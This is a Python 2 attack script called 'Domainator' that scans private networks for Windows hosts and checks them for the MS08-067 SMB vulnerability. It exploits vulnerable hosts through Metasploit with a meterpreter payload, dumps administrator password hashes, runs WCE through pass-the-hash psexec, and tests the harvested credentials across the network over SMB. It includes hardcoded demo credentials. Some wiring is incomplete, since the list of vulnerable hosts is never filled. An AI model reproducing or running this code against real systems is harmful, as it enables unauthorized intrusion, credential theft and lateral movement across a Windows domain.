#!/usr/bin/python

import os, subprocess, nmap, re, sys, time, random
from subprocess import Popen, PIPE
from metasploit.msfrpc import MsfRpcClient

class Host:
    
    def __init__(self, ip, netbiosname, server, user, mac):
        self.ip = ip
        self.netbiosname = netbiosname
        self.server = server
        self.user = user
        self.mac = mac
        self.nmap = None
        self.meterpreter = False
        self.isvul = False
        self.hashes = ""
        self.administrator = ""
        self.osversion=""
        
class Domainator:
    
    def __init__(self, msfrpc_pass = "domainator", networks = ['10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16']):
        self.private_networks = networks
        self.hosts = []
        self.vulhosts = []
        self.msfcmd = open('msfcmd.rc', 'w+')
        self.passwords = []
        self.msfrpc_pass = msfrpc_pass
        
    def scanNetBIOS(self):
        
        for network in self.private_networks:
            output = Popen('nbtscan -q -s \| ' + network,  stdout = PIPE, shell = True)
            response = output.communicate()[0].strip().split('\n')
        
            if len(response) > 1:
                for line in response:
                    ip, netbiosname, server, user, mac  = line.split("|")
                    self.hosts.append(Host(ip.strip(), netbiosname.strip(), server.strip(), user.strip(), mac.strip()))
        
    def setHostFile(self,  filename):
        for linea in open(filename):
            print linea
            ip, host =linea.strip().split('|')
            self.hosts.append(Host(ip.strip(), host.strip(), '', '', ''))
    
    def checkMS08_067(self, host):
        nm2 = nmap.PortScanner()
        
        host.nmap = nm2.scan(host.ip, '445', arguments='-T3 --script smb-check-vulns.nse --script-args=unsafe=1 -P0 --host-timeout 40s')
        
        if 'hostscript' in host.nmap.get('scan')[host.ip]:
            if re.search("MS08-067: VULNERABLE", host.nmap.get('scan')[host.ip]['hostscript'][0]['output']):
                host.isvul = True
                
        return host.isvul
        
    def getOSVersion(self, host):
        
        nm = nmap.PortScanner()
        
        host.nmap= nm.scan(host.ip, '445', arguments='-T3 -O -P0 --host-timeout 10s')
        try:
            host.osversion =  host.nmap.get('scan')[host.ip]['osmatch'][0]['name']
        except:
            pass

    def exploitMS08_067(self, host):
        client = MsfRpcClient(self.msfrpc_pass)
        exploit = client.modules.use('exploit', 'exploit/windows/smb/ms08_067_netapi')
        exploit['RHOST'] =  host.ip
        exploit.execute(payload='windows/meterpreter/bind_tcp')
        if  len(client.sessions.list):
            shell = client.sessions.session(1)
            shell.write('hashdump')
            for i  in  shell.read().split():
                if ":500:" in i:
                    return i


    def uploadWCE(self, host):
        print "[+] Upload WCE en " + host.ip
        
    def executeWCE(self, host):
        cmd = "cmd /c test.exe -w"
        data = subprocess.Popen("psexec.py -hashes " + host.hashes  + ' ' + host.administrator + "@" + host.ip + " \"" +  cmd+ "\" ", stdin = subprocess.PIPE, stdout =subprocess.PIPE, stderr = subprocess.STDOUT, shell = True)
        output = data.communicate()[0]
        print output
        access = [['owasp','OWASP-6E4BEC631','owasp'], ['Administrador', 'OWASP-6E4BEC631', 'OWASPLatam2015']]
        return access
    
    def isAdmin(self, host, user, password):
        status = 1
        message = ""
        smb_filename_put = "tmp_upload"
        smb_file_put = open(smb_filename_put, "w")
        commands = "open " + host + "\nlogin " + user + " " + password + "\nuse C$\n"
        smb_file_put.write(commands)
        smb_file_put.close()
        data = subprocess.Popen("smbclient.py -file " + smb_filename_put + " " + host, stdin = subprocess.PIPE, stdout =subprocess.PIPE, stderr = subprocess.STDOUT, shell = True)
        response = data.communicate()[0]
        
        aux = re.search('SMB SessionError: (.+?)\(', response)
        if aux:
            message = aux.group(1)
            status = 0
        else:
            aux = re.search('STATUS_LOGON_FAILURE', response)
            if aux:
                message = "STATUS_NOT_CONNECT"
                status = 0
            
        return status, message

        
print """
 ##########################################################
  ____                        _             _             
 |  _ \  ___  _ __ ___   __ _(_)_ __   __ _| |_ ___  _ __ 
 | | | |/ _ \| '_ ` _ \ / _` | | '_ \ / _` | __/ _ \| '__|
 | |_| | (_) | | | | | | (_| | | | | | (_| | || (_) | |   
 |____/ \___/|_| |_| |_|\__,_|_|_| |_|\__,_|\__\___/|_|   
 
 Version 1.0
 by Ricardo Supo Picon (ricardosupo@gmail.com)
 My domainators 41m33&J3ym31
 ##########################################################
"""

msfrpc_pass = sys.argv[1]

if len(sys.argv) > 2:
    network = [sys.argv[2]]
    network_scan = Domainator(msfrpc_pass, network)
else:
    network_scan = Domainator(msfrpc_pass)

print "[*] Descubriendo Equipos Windows"
network_scan.scanNetBIOS()
#network_scan.setHostFile('hosts.txt')
print "[*] Equipos Encontrados: " + str(len(network_scan.hosts))

print "[*] Verificando Version de Windows y MS08-067"

for host in network_scan.hosts:
    network_scan.getOSVersion(host)
    if  re.search('XP|2000|2003|Vista', host.osversion):
        if network_scan.checkMS08_067(host):
            print " - " + host.ip + " : " + host.netbiosname + " : " + host.osversion + " : VULNERABLE" 
        else:
            print " - " + host.ip + " : " + host.netbiosname + " : " + host.osversion
    else:
        print " - " + host.ip + " : " + host.netbiosname + " : " + host.osversion

print "[*] Host Vulnerables a MS08-067"

for host in network_scan.vulhosts:
    print " [-] " + host.ip
    network_scan.exploitMS08_067(host)
    if host.meterpreter:
        network_scan.uploadWCE(host)
        network_scan.passwords = network_scan.executeWCE(host)

for password in network_scan.passwords:
    for host in network_scan.hosts:
        status, message = network_scan.isAdmin(host.ip, password[0], password[2])
        if status == 1:
            print " - " + host.ip + ' Login OK -> ' +  password[0] + ":"  + password[2]
        else:
            print " - " + host.ip + ' Login NOOK -> ' +  password[0] + ":"  + password[2] + ' ' + message